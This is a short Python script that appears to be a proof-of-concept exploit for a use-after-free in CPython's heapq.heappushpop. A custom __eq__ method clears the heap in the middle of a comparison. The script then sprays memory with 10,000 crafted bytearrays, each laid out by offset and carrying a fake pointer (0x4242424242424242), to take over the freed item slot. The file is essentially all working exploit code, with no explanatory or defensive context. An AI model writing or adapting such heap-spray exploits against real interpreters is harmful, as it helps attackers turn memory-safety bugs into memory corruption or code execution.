import heapq

class Evil1:
    def __eq__(self, other):
        dummy = [(i, i) for i in range(10000)]
        del dummy
        
        heap.clear()
        
        # Test if ob_item[1] is at offset 16
        fake_pointer = (0x4242424242424242).to_bytes(8, 'little')
        # We need size 31
        # 0..7 = b'A'*8
        # 8..15 = 0 (ob_item[0])
        # 16..23 = fake_pointer
        # 24..30 = b'A'*7
        payload = b'A'*8 + (0).to_bytes(8, 'little') + fake_pointer + b'A'*7
        
        global spray
        spray = [bytearray(payload) for _ in range(10000)]
        
        return True

class Evil2:
    def __gt__(self, other):
        return True

heap = [(Evil1(), 0)]

try:
    heapq.heappushpop(heap, (0, Evil2()))
except Exception as e:
    print('Exception:', e)
print("Done")
